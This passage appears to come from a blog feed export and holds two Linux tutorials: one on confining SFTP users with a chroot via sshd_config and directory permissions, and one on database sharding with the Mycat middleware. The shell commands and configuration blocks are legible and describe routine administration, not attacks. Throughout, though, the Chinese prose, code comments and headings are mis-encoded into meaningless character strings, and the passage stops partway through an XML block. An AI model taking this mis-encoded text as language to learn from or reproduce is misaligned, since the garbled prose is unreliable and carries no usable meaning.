çš„å¯†ç  ã€‚</div><div class="line">æ–°çš„ å¯†ç ï¼š</div><div class="line">é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š</div><div class="line">passwdï¼š æ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚</div></pre></div></div></figure><h1 id="0x01-ä¿®æ”¹sshd-configé…ç½®æ–‡ä»¶"><a href="#0x01-ä¿®æ”¹sshd-configé…ç½®æ–‡ä»¶" class="headerlink" title="0x01 ä¿®æ”¹sshd_configé…ç½®æ–‡ä»¶"></a>0x01 ä¿®æ”¹sshd_configé…ç½®æ–‡ä»¶</h1><h2 id="ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š-etc-ssh-sshd-config"><a href="#ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š-etc-ssh-sshd-config" class="headerlink" title="ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š/etc/ssh/sshd_config"></a>ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š<code>/etc/ssh/sshd_config</code></h2><p>ä¿®æ”¹<code>Subsystem      sftp    /usr/libexec/openssh/sftp-server</code>ä¸º<code>Subsystem         sftp    internal-sftp</code></p><p>ä»¥ä¸‹æ˜¯å¯¹<code>sftp</code>ç»„æƒé™é…ç½®</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">#åŒ¹é… sftp ç»„çš„ç”¨æˆ·</div><div class="line">Match Group sftp</div><div class="line">  #é”å®šçš„ç›®å½•</div><div class="line">  ChrootDirectory /data/test</div><div class="line">  #æŒ‡å®šä½¿ç”¨sftpæœåŠ¡ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„internal-sftp</div><div class="line">  ForceCommand internal-sftp</div><div class="line">  #å¦‚æœä¸å¸Œæœ›è¯¥ç”¨æˆ·èƒ½ä½¿ç”¨ç«¯å£è½¬å‘å°±åŠ ä¸Šï¼Œå¦åˆ™åˆ æ‰</div><div class="line">  AllowTcpForwarding no</div><div class="line">  X11Forwarding no</div></pre></div></div></figure><p>æˆ–è€…å¯¹<code>user</code>ç”¨æˆ·æƒé™é…ç½®</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">#åŒ¹é… user ç”¨æˆ·</div><div class="line">Match User user</div><div class="line">  #ChrootDirectory %u (%uä»£è¡¨å˜é‡ç”¨æˆ·å)</div><div class="line">  ChrootDirectory /data/test</div><div class="line">  ForceCommand internal-sftp</div><div class="line">  AllowTcpForwarding no</div><div class="line">  PermitTunnel no</div><div class="line">  X11Forwarding no</div></pre></div></div></figure><h2 id="ä¿®æ”¹é”å®šç”¨æˆ·ç›®å½•çš„æƒé™"><a href="#ä¿®æ”¹é”å®šç”¨æˆ·ç›®å½•çš„æƒé™" class="headerlink" title="ä¿®æ”¹é”å®šç”¨æˆ·ç›®å½•çš„æƒé™"></a>ä¿®æ”¹é”å®šç”¨æˆ·ç›®å½•çš„æƒé™</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#æ‰€æœ‰è€…è®¾ç½®ä¸ºäº†rootï¼Œæ‰€æœ‰ç»„è®¾ç½®ä¸ºsftp</span></div><div class="line">chown root:sftp /data/<span class="built_in">test</span></div><div class="line"><span class="comment">#æƒé™è®¾ç½®ä¸º755ï¼Œæ‰€æœ‰è€…rootæœ‰å†™å…¥æƒé™ï¼Œè€Œæ‰€æœ‰ç»„sftpæ— å†™å…¥æƒé™</span></div><div class="line">chmod -R 755 /data/<span class="built_in">test</span></div></pre></div></div></figure><div class="note danger"><p>ç›®å½•çš„æƒé™è®¾å®šæœ‰ä¸¤ä¸ªè¦ç‚¹ï¼š<br>1ã€ç”±ChrootDirectoryæŒ‡å®šçš„ç›®å½•å¼€å§‹ä¸€ç›´å¾€ä¸Šåˆ°ç³»ç»Ÿæ ¹ç›®å½•ä¸ºæ­¢çš„ç›®å½•æ‹¥æœ‰è€…éƒ½åªèƒ½æ˜¯root<br>2ã€ç”±ChrootDirectoryæŒ‡å®šçš„ç›®å½•å¼€å§‹ä¸€ç›´å¾€ä¸Šåˆ°ç³»ç»Ÿæ ¹ç›®å½•ä¸ºæ­¢éƒ½ä¸å¯ä»¥å…·æœ‰ç¾¤ç»„å†™å…¥æƒé™ï¼ˆæœ€å¤§æƒé™ä¸º755ï¼‰</p></div><h2 id="æ·»åŠ å¯ä¸Šä¼ åˆ é™¤ç›®å½•"><a href="#æ·»åŠ å¯ä¸Šä¼ åˆ é™¤ç›®å½•" class="headerlink" title="æ·»åŠ å¯ä¸Šä¼ åˆ é™¤ç›®å½•"></a>æ·»åŠ å¯ä¸Šä¼ åˆ é™¤ç›®å½•</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">mkdir /data/test/upload</div><div class="line">chown user:sftp /data/test/upload</div><div class="line">#å…è®¸userç”¨æˆ·æœ‰è¯»å†™æƒé™ï¼Œç¾¤ç»„å¤–ç”¨æˆ·æ— å†™å…¥æƒé™</div><div class="line">chmod 755 /data/test/upload</div></pre></div></div></figure><figure class="highlight sh"><figcaption><span class="caption">æ­¤æ—¶ç›®å½•æƒé™ç»“æ„</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">drwxr-xr-x  19 root sftp      4096 9æœˆ   4 17:52 /data/<span class="built_in">test</span></div><div class="line marked"><span class="built_in">test</span>ç›®å½•ä¸‹ï¼Œuserç”¨æˆ·å¯è¯»ä¸å¯å†™</div><div class="line"></div><div class="line">drwxr-xr-x  4  user sftp      4096 9æœˆ  28 12:02 /data/<span class="built_in">test</span>/upload</div><div class="line marked">uploadç›®å½•ä¸‹ï¼Œuserç”¨æˆ·å¯è¿›è¡Œè¯»å†™æ“ä½œ</div></pre></div></div></figure><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">#é‡å¯SSHDä½¿é…ç½®ç”Ÿæ•ˆ</div><div class="line">service sshd restart</div></pre></div></div></figure><h1 id="0x02-ä½¿ç”¨xftpæµ‹è¯•è¿æ¥"><a href="#0x02-ä½¿ç”¨xftpæµ‹è¯•è¿æ¥" class="headerlink" title="0x02 ä½¿ç”¨xftpæµ‹è¯•è¿æ¥"></a>0x02 ä½¿ç”¨xftpæµ‹è¯•è¿æ¥</h1><p><img src="https://kionf.com/article_images/stfp.png" alt="kionf"></p>]]></content>
      
      <categories>
          
          <category> SSH </category>
          
          <category> sftp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sftp </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mycatåˆ†åº“åˆ†è¡¨</title>
      <link href="/2017/05/07/mysql-mycat/"/>
      <url>/2017/05/07/mysql-mycat/</url>
      <content type="html"><![CDATA[<h1 id="0x00-æ•°æ®åˆ‡åˆ†"><a href="#0x00-æ•°æ®åˆ‡åˆ†" class="headerlink" title="0x00 æ•°æ®åˆ‡åˆ†"></a>0x00 æ•°æ®åˆ‡åˆ†</h1><blockquote class="blockquote-center"><p>   ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŒ‡é€šè¿‡æŸç§ç‰¹å®šçš„æ¡ä»¶ï¼Œå°†æˆ‘ä»¬å­˜æ”¾åœ¨åŒä¸€ä¸ªæ•°æ®åº“ä¸­çš„æ•°æ®åˆ†æ•£å­˜æ”¾åˆ°å¤šä¸ªæ•°æ®åº“ï¼ˆä¸»<br>æœºï¼‰ä¸Šé¢ï¼Œä»¥è¾¾åˆ°åˆ†æ•£å•å°è®¾å¤‡è´Ÿè½½çš„æ•ˆæœï¼Œå³åˆ†åº“åˆ†è¡¨ã€‚</p></blockquote><a id="more"></a><p>æ•°æ®çš„åˆ‡åˆ†æ ¹æ®å…¶åˆ‡åˆ†è§„åˆ™çš„ç±»å‹ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ‡åˆ†æ¨¡å¼ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">å‚ç›´ï¼ˆçºµå‘ï¼‰åˆ‡åˆ†ï¼š æŒ‰ç…§ä¸åŒçš„è¡¨ï¼ˆæˆ–è€…Schemaï¼‰æ¥åˆ‡åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ï¼ˆä¸»æœºï¼‰ä¹‹ä¸Šï¼›</div><div class="line"></div><div class="line">æ°´å¹³ï¼ˆæ¨ªå‘ï¼‰åˆ‡åˆ†ï¼š æ ¹æ®è¡¨ä¸­çš„æ•°æ®çš„é€»è¾‘å…³ç³»ï¼Œå°†åŒä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®æŒ‰ç…§æŸç§æ¡ä»¶æ‹†åˆ†åˆ°å¤šå°æ•°æ®åº“ï¼ˆä¸»æœºï¼‰ä¸Šé¢ã€‚</div></pre></div></div></figure><h2 id="1-å‚ç›´åˆ‡åˆ†"><a href="#1-å‚ç›´åˆ‡åˆ†" class="headerlink" title="1. å‚ç›´åˆ‡åˆ†"></a>1. å‚ç›´åˆ‡åˆ†</h2><p>  ä¸€ä¸ªæ•°æ®åº“ç”±å¤šä¸ªè¡¨æ„æˆï¼Œæ¯ä¸ªè¡¨å¯¹åº”ç€ä¸åŒçš„ä¸šåŠ¡ï¼Œå‚ç›´åˆ‡åˆ†æ˜¯æŒ‡æŒ‰ç…§ä¸šåŠ¡å°†è¡¨è¿›è¡Œåˆ†ç±»ï¼Œåˆ†å¸ƒåˆ°ä¸åŒ<br>çš„æ•°æ®åº“ä¸Šé¢ï¼Œè¿™æ ·ä¹Ÿå°±å°†æ•°æ®æˆ–è€…è¯´å‹åŠ›åˆ†æ‹…åˆ°ä¸åŒçš„åº“ä¸Šé¢ï¼ˆä¸“åº“ä¸“ç”¨ï¼‰ã€‚ä¾‹ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">#æœ‰å¦‚ä¸‹å‡ å¼ è¡¨</div><div class="line"></div><div class="line">--------------+--------------+------------------</div><div class="line">ç”¨æˆ·ä¿¡æ¯(user)+ äº¤æ˜“è®°å½•(pay)+  å•†å“(commodity)|</div><div class="line">--------------+--------------+------------------</div></pre></div></div></figure><p>å‚ç›´åˆ‡åˆ†æ ¹æ®æ¯ä¸ªè¡¨çš„ä¸åŒä¸šåŠ¡è¿›è¡Œåˆ‡å‰²ï¼Œuserè¡¨ï¼Œpayè¡¨ï¼Œcommodityè¡¨ï¼Œæ¯ä¸ªè¡¨åˆ‡åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ä¸Šã€‚</p><p><img src="https://kionf.com/article_images/%E5%9E%82%E7%9B%B4.png" alt="å‚ç›´åˆ‡åˆ†"></p><p>ä¼˜ç‚¹ï¼š</p><ul><li>æ‹†åˆ†åä¸šåŠ¡æ¸…æ™°ï¼Œæ‹†åˆ†è§„åˆ™æ˜ç¡®ã€‚</li><li>ç³»ç»Ÿä¹‹é—´æ•´åˆæˆ–æ‰©å±•å®¹æ˜“ã€‚</li><li>æ•°æ®ç»´æŠ¤ç®€å•ã€‚</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>éƒ¨åˆ†ä¸šåŠ¡è¡¨æ— æ³• joinï¼Œåªèƒ½é€šè¿‡æ¥å£æ–¹å¼è§£å†³ï¼Œæé«˜äº†ç³»ç»Ÿå¤æ‚åº¦ã€‚</li><li>å—æ¯ç§ä¸šåŠ¡ä¸åŒçš„é™åˆ¶å­˜åœ¨å•åº“æ€§èƒ½ç“¶é¢ˆï¼Œä¸æ˜“æ•°æ®æ‰©å±•è·Ÿæ€§èƒ½æé«˜ã€‚</li><li>äº‹åŠ¡å¤„ç†å¤æ‚ã€‚</li></ul><h2 id="2-æ°´å¹³åˆ‡åˆ†"><a href="#2-æ°´å¹³åˆ‡åˆ†" class="headerlink" title="2. æ°´å¹³åˆ‡åˆ†"></a>2. æ°´å¹³åˆ‡åˆ†</h2><p>  ç›¸å¯¹äºå‚ç›´æ‹†åˆ†ï¼Œæ°´å¹³æ‹†åˆ†ä¸æ˜¯å°†è¡¨åšåˆ†ç±»ï¼Œè€Œæ˜¯æŒ‰ç…§æŸä¸ªå­—æ®µçš„æŸç§è§„åˆ™æ¥åˆ†æ•£åˆ°å¤šä¸ªåº“ä¹‹ä¸­ï¼Œæ¯ä¸ªè¡¨ä¸­<br>åŒ…å«ä¸€éƒ¨åˆ†æ•°æ®ã€‚ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®çš„æ°´å¹³åˆ‡åˆ†ç†è§£ä¸ºæ˜¯æŒ‰ç…§æ•°æ®è¡Œçš„åˆ‡åˆ†ï¼Œå°±æ˜¯å°†è¡¨ä¸­çš„æŸäº›è¡Œåˆ‡åˆ†<br>åˆ°ä¸€ä¸ªæ•°æ®åº“ï¼Œè€Œå¦å¤–çš„æŸäº›è¡Œåˆåˆ‡åˆ†åˆ°å…¶ä»–çš„æ•°æ®åº“ä¸­ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://kionf.com/article_images/%E6%B0%B4%E5%B9%B3.png" alt="æ°´å¹³åˆ‡åˆ†"></p><p>ä¼˜ç‚¹ï¼š</p><ul><li>æ‹†åˆ†è§„åˆ™æŠ½è±¡å¥½ï¼Œjoin æ“ä½œåŸºæœ¬å¯ä»¥æ•°æ®åº“åšã€‚</li><li>ä¸å­˜åœ¨å•åº“å¤§æ•°æ®ï¼Œé«˜å¹¶å‘çš„æ€§èƒ½ç“¶é¢ˆã€‚</li><li>åº”ç”¨ç«¯æ”¹é€ è¾ƒå°‘ã€‚</li><li>æé«˜äº†ç³»ç»Ÿçš„ç¨³å®šæ€§è·Ÿè´Ÿè½½èƒ½åŠ›ã€‚</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>æ‹†åˆ†è§„åˆ™éš¾ä»¥æŠ½è±¡ã€‚</li><li>åˆ†ç‰‡äº‹åŠ¡ä¸€è‡´æ€§éš¾ä»¥è§£å†³ã€‚</li><li>æ•°æ®å¤šæ¬¡æ‰©å±•éš¾åº¦è·Ÿç»´æŠ¤é‡æå¤§ã€‚</li><li>è·¨åº“ join æ€§èƒ½è¾ƒå·®ã€‚</li></ul><p><strong>å…±åŒç‰¹ç‚¹ç¼ºç‚¹</strong></p><ul><li>å¼•å…¥åˆ†å¸ƒå¼äº‹åŠ¡çš„é—®é¢˜</li><li>è·¨èŠ‚ç‚¹ Join çš„é—®é¢˜</li><li>è·¨èŠ‚ç‚¹åˆå¹¶æ’åºåˆ†é¡µé—®é¢˜</li><li>å¤šæ•°æ®æºç®¡ç†é—®é¢˜</li></ul><p>ä»‹ç»å®Œä¸¤ç§åˆ‡åˆ†æ–¹å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡éœ€æ±‚æ¥é€‰æ‹©ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ä¸­é—´ä»¶æ¥è¿›è¡Œæ•°æ®çš„åˆ‡åˆ†</p><h1 id="0x01-åˆ†åº“åˆ†è¡¨ä¸­é—´ä»¶Mycat"><a href="#0x01-åˆ†åº“åˆ†è¡¨ä¸­é—´ä»¶Mycat" class="headerlink" title="0x01 åˆ†åº“åˆ†è¡¨ä¸­é—´ä»¶Mycat"></a>0x01 åˆ†åº“åˆ†è¡¨ä¸­é—´ä»¶Mycat</h1><blockquote class="blockquote-center"><p><a href="http://mycat.io/document/Mycat_V1.6.0.pdf" target="_blank" rel="noopener">Mycat</a>å®ƒæ˜¯ä¸€ä¸ª<code>å¼€æºçš„åˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿ</code>ï¼Œ å¼ºå¤§çš„æ•°æ®åº“ä¸­é—´ä»¶ï¼Œå®ç°äº† MySQL åè®®çš„çš„Server,å‰ç«¯ç”¨æˆ·å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªæ•°æ®åº“ä»£ç†ï¼Œç”¨ MySQL å®¢æˆ·ç«¯å·¥å…·å’Œå‘½ä»¤è¡Œè®¿é—®ï¼Œè€Œå…¶åç«¯å¯ä»¥ç”¨MySQL åŸç”Ÿï¼ˆNativeï¼‰åè®®ä¸å¤šä¸ª MySQL æœåŠ¡å™¨é€šä¿¡ï¼Œä¹Ÿå¯ä»¥ç”¨ JDBC åè®®ä¸å¤§å¤šæ•°ä¸»æµæ•°æ®åº“æœåŠ¡å™¨é€šä¿¡ï¼Œ<code>å…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ†è¡¨åˆ†åº“</code>ï¼Œå³å°†ä¸€ä¸ªå¤§è¡¨æ°´å¹³åˆ†å‰²ä¸º N ä¸ªå°è¡¨ï¼Œå­˜å‚¨åœ¨åç«¯ MySQL æœåŠ¡å™¨é‡Œæˆ–è€…å…¶ä»–æ•°æ®åº“é‡Œã€‚</p></blockquote><p><strong>å®éªŒæœºå™¨ç¯å¢ƒ</strong>ï¼š<code>CentOS6.8(2å°)</code>, <code>JDK8</code>, <code>Mycat1.6</code>, <code>MySql5.1.73</code></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">server1 192.168.1.214 mysql</div><div class="line">server2 192.168.1.216 mycat JDK</div></pre></div></div></figure><h2 id="1-å®‰è£…Mycat"><a href="#1-å®‰è£…Mycat" class="headerlink" title="1. å®‰è£…Mycat"></a>1. å®‰è£…Mycat</h2><p>Mycatä¾èµ–javaç¯å¢ƒï¼Œæ‰€ä»¥è¦å®‰è£…jdkï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨<code>yum -y install java</code> å®‰è£…javaç¯å¢ƒ</p><blockquote><p>å¦‚æœéœ€è¦<code>jps, jmap</code>ç­‰å‘½ä»¤åˆ™æ‰§è¡Œ<code>yum -y install java-devel</code></p></blockquote><p>ä¸‹è½½Mycat</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#æ‰§è¡Œåœ¨server2</span></div><div class="line"></div><div class="line">mkdir -p /usr/<span class="built_in">local</span>/mycat &amp;&amp; <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mycat</div><div class="line"></div><div class="line">wget -c -t5 -O Mycat-1.6.tar.gz <span class="string">"http://dl.mycat.io/1.6-RELEASE/Mycat-server-1.6-RELEASE-20161028204710-linux.tar.gz"</span></div><div class="line"></div><div class="line">tar xvf Mycat-1.6.tar.gz -C ./</div></pre></div></div></figure><p>æˆ‘ä»¬æ¥å¤§æ¦‚çœ‹ä¸€ä¸‹Mycatçš„ç›®å½•ç»“æ„ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line">.</div><div class="line">â”œâ”€â”€ bin</div><div class="line">â”‚   â”œâ”€â”€ mycat          Mycatå¯åŠ¨ç¨‹åº</div><div class="line">â”‚   â”œâ”€â”€ ...</div><div class="line">â”œâ”€â”€ catlet</div><div class="line">â”œâ”€â”€ conf</div><div class="line">â”‚   â”œâ”€â”€ log4j2.xml     æ—¥å¿—çš„é…ç½® æ ¹æ®è‡ªå·±çš„éœ€è¦å¯ä»¥è°ƒæ•´è¾“å‡ºçº§åˆ«ä¸ºdebug</div><div class="line">â”‚   â”œâ”€â”€ rule.xml       åˆ†ç‰‡è§„åˆ™çš„é…ç½®æ–‡ä»¶ï¼Œåˆ†ç‰‡è§„åˆ™çš„å…·ä½“å‚æ•°ä¿¡æ¯å•ç‹¬å­˜æ”¾ä¸ºæ–‡ä»¶ï¼Œä¹Ÿåœ¨å½“å‰ç›®å½•ï¼Œé…ç½®æ–‡ä»¶ä¿®æ”¹éœ€è¦é‡å¯MyCATã€‚</div><div class="line">â”‚   â”œâ”€â”€ schema.xml     é€»è¾‘åº“å®šä¹‰å’Œè¡¨ä»¥åŠåˆ†ç‰‡å®šä¹‰çš„é…ç½®æ–‡ä»¶ã€‚</div><div class="line">â”‚   â”œâ”€â”€ server.xml     MycatæœåŠ¡å™¨å‚æ•°è°ƒæ•´å’Œç”¨æˆ·æˆæƒçš„é…ç½®æ–‡ä»¶ã€‚</div><div class="line">â”‚   â”œâ”€â”€ wrapper.conf   JVMå†…å­˜é…ç½®æ–‡ä»¶</div><div class="line">â”‚   â”œâ”€â”€ zkconf         Zookeeperé…ç½®ç›®å½•</div><div class="line">â”œâ”€â”€ lib                MyCATè‡ªèº«çš„jaråŒ…æˆ–ä¾èµ–çš„jaråŒ…çš„å­˜æ”¾ç›®å½•ã€‚</div><div class="line">â”œâ”€â”€ logs               MyCATæ—¥å¿—çš„å­˜æ”¾ç›®å½•ã€‚æ—¥å¿—å­˜æ”¾åœ¨logs/logä¸­ï¼Œæ¯å¤©ä¸€ä¸ªæ–‡ä»¶ã€‚</div><div class="line">â””â”€â”€ version.txt        ç‰ˆæœ¬ä¿¡æ¯</div></pre></div></div></figure><h2 id="2-é…ç½®"><a href="#2-é…ç½®" class="headerlink" title="2. é…ç½®"></a>2. é…ç½®</h2><h3 id="é…ç½®MycatæœåŠ¡å™¨å‚æ•°"><a href="#é…ç½®MycatæœåŠ¡å™¨å‚æ•°" class="headerlink" title="é…ç½®MycatæœåŠ¡å™¨å‚æ•°"></a>é…ç½®MycatæœåŠ¡å™¨å‚æ•°</h3><p>ç¼–è¾‘MycatæœåŠ¡å™¨å‚æ•°è°ƒæ•´å’Œç”¨æˆ·æˆæƒçš„é…ç½®æ–‡ä»¶<code>vim conf/server.xml</code>(é…ç½®æ–‡ä»¶ä¸­æœ‰æ³¨é‡Š)é¦–å…ˆå¤‡ä»½ä¸€ä»½ï¼Œ<code>cp conf/server.xml conf/server.xml.bak</code><br>è·³è½¬åˆ°æ–‡ä»¶å°¾éƒ¨ç¼–è¾‘å¦‚ä¸‹</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></div><div class="code"><pre><div class="line"><span class="comment">&lt;!--æ­¤å¤„å®šä¹‰çš„ç”¨æˆ·ï¼Œä¸ºClientè¿æ¥Mycatçš„ç”¨æˆ·å¯†ç ï¼Œå¯ä»¥é…ç½®ç›¸å…³æ•°æ®åº“åŠè¡¨è¯»å†™çš„æƒé™ï¼Œ--&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">"root"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"schemas"</span>&gt;</span>TESTDB<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--&lt;property name="readOnly"&gt;true&lt;/property&gt;--&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></div><div class="line">        </div><div class="line">        <span class="comment">&lt;!--  è¡¨çº§ DML æƒé™è®¾ç½®   --&gt;</span></div><div class="line">        <span class="comment">&lt;!--       </span></div><div class="line"><span class="comment">        &lt;privileges check="false"&gt;</span></div><div class="line"><span class="comment">                &lt;schema name="TESTDB" dml="0110" &gt;</span></div><div class="line"><span class="comment">                        &lt;table name="tb01" dml="0000"&gt;&lt;/table&gt;</span></div><div class="line"><span class="comment">                        &lt;table name="tb02" dml="1111"&gt;&lt;/table&gt;</span></div><div class="line"><span class="comment">                &lt;/schema&gt;</span></div><div class="line"><span class="comment">        &lt;/privileges&gt;           </span></div><div class="line"><span class="comment">         --&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--æ­¤å¤„å®šä¹‰è¿æ¥IPç™½åå•å’Œ SQL é»‘åå•--&gt;</span></div><div class="line"></div><div class="line">        <span class="comment">&lt;!-- å…¨å±€SQLé˜²ç«å¢™è®¾ç½® --&gt;</span></div><div class="line">        <span class="comment">&lt;!-- </span></div><div class="line"><span class="comment">&lt;firewall&gt;</span></div><div class="line"><span class="comment"> &lt;whitehost&gt;</span></div><div class="line"><span class="comment"> &lt;host user="mycat" host="127.0.0.1"&gt;&lt;/host&gt; ip ç™½åå• ç”¨æˆ·å¯¹åº”çš„å¯ä»¥è®¿é—®çš„ ip åœ°å€</span></div><div class="line"><span class="comment"> &lt;/whitehost&gt;</span></div><div class="line"><span class="comment"> &lt;blacklist check="true"&gt;</span></div><div class="line"><span class="comment"> &lt;property name="selelctAllow"&gt;false&lt;/property&gt; é»‘åå•å…è®¸çš„ æƒé™ åé¢ä¸ºé»˜è®¤</span></div><div class="line"><span class="comment"> &lt;/blacklist&gt;</span></div><div class="line"><span class="comment">&lt;/firewall&gt;</span></div><div class="line"><span class="comment">--&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">#</div></pre></div></div></figure><h3 id="é…ç½®é€»è¾‘åº“è¡¨ï¼Œåˆ†ç‰‡å®šä¹‰"><a href="#é…ç½®é€»è¾‘åº“è¡¨ï¼Œåˆ†ç‰‡å®šä¹‰" class="headerlink" title="é…ç½®é€»è¾‘åº“è¡¨ï¼Œåˆ†ç‰‡å®šä¹‰"></a>é…ç½®é€»è¾‘åº“è¡¨ï¼Œåˆ†ç‰‡å®šä¹‰</h3><p>ç¼–è¾‘é€»è¾‘åº“å®šä¹‰å’Œè¡¨ä»¥åŠåˆ†ç‰‡å®šä¹‰çš„é…ç½®æ–‡ä»¶<code>vim conf/schema.xml</code>åŒæ ·å…ˆå¤‡ä»½ä¸€ä»½<code>cp conf/schema.xml conf/schema.xml.bak</code>ç¼–è¾‘ä¸ºå¦‚ä¸‹å†…å®¹</p><p>æœ‰å¦‚ä¸‹è¡¨ç»“æ„ï¼š</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line">+<span class="comment">--------------------+-------+------------------------+--------------------+</span></div><div class="line">| ID                 | LEVEL | EXTEND_ATTR            | UID                |</div><div class="line">+<span class="comment">--------------------+-------+------------------------+--------------------+</span></div><div class="line">| 298599220716244992 |     1 | &#123;&#125;                     | 298321762779664384 |</div><div class="line">| 298600412901019648 |     0 | &#123;&#125;                     | 298321762779664384 |</div><div class="line">| 298682157746884608 |     3 | &#123;"129":2&#125;              | 298667788531142656 |</div><div class="line">| 298684200884637696 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298685806279659520 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298686594007699456 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298687219567169536 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298688215626289152 |     1 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298689820996145152 |     1 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">+<span class="comment">--------------------+-------+------------------------+--------------------+</span></div></pre></div></div></figure><p>è¿™é‡Œé€‰æ‹©æ ¹æ®UIDè¿›è¡Œæ°´å¹³åˆ‡åˆ†ï¼Œé…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></div><div class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span 